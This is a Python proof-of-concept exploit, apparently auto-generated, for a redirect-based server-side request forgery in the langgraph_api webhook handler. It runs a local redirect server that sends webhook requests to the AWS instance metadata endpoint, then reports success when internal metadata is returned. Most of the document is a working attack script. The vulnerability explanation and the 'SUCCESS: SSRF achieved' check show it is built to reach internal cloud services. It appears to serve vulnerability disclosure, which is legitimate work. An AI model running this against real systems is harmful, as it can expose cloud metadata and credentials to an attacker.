#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-012
# Sink: ensure_webhook_http_client
# Auto-generated — run with: python3 ssrf_asyncclient_ensure_webhook_http_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src webhook handler.

Vulnerability: The webhook URL is user-controlled and validated only at the initial
request. However, the HTTP client follows redirects (follow_redirects=True) without
re-validating the target. An attacker can host a server that redirects to internal
IPs (e.g., 169.254.169.254) to bypass SSRF protections.

This PoC:
1. Starts a local HTTP server that redirects to a configurable internal target.
2. Simulates the vulnerable webhook call by sending a POST request to the redirector.
3. Demonstrates that the client follows the redirect to the internal IP.

Usage:
    python3 poc_ssrf_redirect.py [--redirect-target TARGET] [--listen-port PORT]

    Default redirect target: http://169.254.169.254/latest/meta-data/
    Default listen port: 9999

Requirements: Python 3.7+ (stdlib only, no external dependencies)
"""

import argparse
import http.server
import json
import logging
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("poc_ssrf")


class RedirectHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that responds with a 302 redirect to the target URL."""

    # Class variable to store the redirect target (set from outside)
    redirect_target = "http://169.254.169.254/latest/meta-data/"

    def do_POST(self):
        """Handle POST requests by sending a redirect response."""
        self.send_response(302)
        self.send_header("Location", self.redirect_target)
        self.end_headers()
        logger.info(
            "Redirector: Received POST, sending 302 redirect to %s",
            self.redirect_target,
        )

    def do_GET(self):
        """Handle GET requests (fallback) with a redirect."""
        self.do_POST()

    def log_message(self, format, *args):
        """Suppress default logging to avoid noise."""
        pass


def start_redirect_server(host: str, port: int, target: str) -> http.server.HTTPServer:
    """
    Start a simple HTTP server that redirects all requests to the given target.

    Args:
        host: Host to bind to (default: 0.0.0.0)
        port: Port to listen on
        target: URL to redirect to

    Returns:
        The started HTTPServer instance.
    """
    RedirectHandler.redirect_target = target
    server = http.server.HTTPServer((host, port), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    logger.info("Redirect server listening on %s:%s", host, port)
    return server


def simulate_vulnerable_webhook_call(webhook_url: str, timeout: int = 10) -> None:
    """
    Simulate the vulnerable webhook call from langgraph_api.

    This mimics the behavior of:
        await http_request("POST", webhook, json=payload, headers=headers, client=webhook_client)

    where webhook_client has follow_redirects=True.

    Args:
        webhook_url: The URL to send the POST request to (the redirector).
        timeout: Request timeout in seconds.
    """
    payload = {
        "status": "completed",
        "run_id": "poc-test-run-12345",
        "webhook_sent_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "values": {"poc": "test"},
    }

    logger.info("Sending POST to webhook URL: %s", webhook_url)
    logger.info("Payload: %s", json.dumps(payload, indent=2))

    try:
        # Create a request that follows redirects (like the vulnerable client)
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )

        # urllib.request follows redirects by default (like httpx with follow_redirects=True)
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read()
            logger.info("Response status: %s", response.status)
            logger.info("Response headers: %s", dict(response.headers))
            logger.info("Response body (first 500 chars): %s", body[:500].decode("utf-8", errors="replace"))

            # Check if we reached the internal target (e.g., AWS metadata)
            if "169.254.169.254" in webhook_url or "latest" in body.decode("utf-8", errors="replace"):
                logger.warning("SUCCESS: SSRF achieved! Reached internal metadata endpoint.")
            else:
                logger.info("Request completed (may or may not be internal).")

    except urllib.error.HTTPError as e:
        logger.error("HTTP error: %s - %s", e.code, e.reason)
        if e.code == 404:
            logger.info("Got 404 - this is expected if the internal target doesn't exist.")
        elif e.code in (301, 302, 307, 308):
            logger.info("Got redirect status - this confirms redirect following works.")
    except urllib.error.URLError as e:
        logger.error("URL error: %s", e.reason)
        if "Connection refused" in str(e.reason):
            logger.error("Connection refused - internal service may not be running.")
        elif "Timeout" in str(e.reason):
            logger.error("Request timed out - internal host may be blocking.")
    except Exception as e:
        logger.error("Unexpected error: %s", e)


def check_local_port(port: int) -> bool:
    """Check if a local port is available."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("0.0.0.0", port))
            return True
        except OSError:
            return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api webhook"
    )
    parser.add_argument(
        "--redirect-target",
        default="http://169.254.169.254/latest/meta-data/",
        help="Internal URL to redirect to (default: AWS metadata endpoint)",
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=9999,
        help="Port for the redirect server (default: 9999)",
    )
    parser.add_argument(
        "--listen-host",
        default="0.0.0.0",
        help="Host to bind redirect server (default: 0.0.0.0)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)",
    )
    args = parser.parse_args()

    # Validate port
    if not check_local_port(args.listen_port):
        logger.error(
            "Port %s is already in use. Use --listen-port to specify a different port.",
            args.listen_port,
        )
        sys.exit(1)

    # Start the redirect server
    redirect_server = start_redirect_server(
        args.listen_host, args.listen_port, args.redirect_target
    )

    # Give the server a moment to start
    time.sleep(0.5)

    # The webhook URL that the attacker controls (points to our redirect server)
    attacker_webhook_url = f"http://127.0.0.1:{args.listen_port}/webhook"

    logger.info("=" * 60)
    logger.info("SSRF Redirect Bypass PoC")
    logger.info("=" * 60)
    logger.info("Attacker-controlled webhook URL: %s", attacker_webhook_url)
    logger.info("Redirect target (internal): %s", args.redirect_target)
    logger.info("")
    logger.info("This simulates the vulnerable webhook call where:")
    logger.info("  1. validate_webhook_url_or_raise() checks the initial URL (passes)")
    logger.info("  2. The HTTP client follows the 302 redirect to the internal target")
    logger.info("  3. No re-validation occurs on the redirect target")
    logger.info("")

    # Simulate the vulnerable call
    simulate_vulnerable_webhook_call(attacker_webhook_url, timeout=args.timeout)

    # Cleanup
    redirect_server.shutdown()
    logger.info("PoC completed. Redirect server stopped.")


if __name__ == "__main__":
    main()
